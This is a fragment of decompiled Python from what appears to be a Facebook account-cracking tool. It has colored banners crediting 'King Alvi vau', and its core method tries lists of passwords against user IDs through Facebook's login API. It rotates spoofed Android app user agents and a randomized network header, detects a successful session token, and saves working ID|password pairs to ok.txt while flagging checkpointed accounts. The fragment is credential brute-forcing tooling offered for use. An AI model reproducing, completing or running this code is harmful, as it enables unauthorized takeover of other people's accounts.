# Decompile by Mardis (Tools By Alvi vau Mallik)
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\033[92;1m╰───────────────────────────────────────────────────────────╯
\033[92;1m╰───────────────────────────────────────────────────────────╯
 \033[1;32m[\033[0;41;37m==========={ AUTHER 🔥\033[0;37;41m KING Alvi vau }===========\033[1;37;40m\033[1;32m] \033[1;37;40m     
   """
...
class Main:
	...
	def api(self, uid, pwx):
		ua = random.choice([
			"DAlvi vauk/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
		...
		for pw in pwx:
			...
			headers = {
				...
				"x-fb-net-hni": str(random.randint(30000, 50000)), 
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [Alvi vau-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [Alvi vau-CP] %s | %s\033[0;97m         "%(uid, pw))
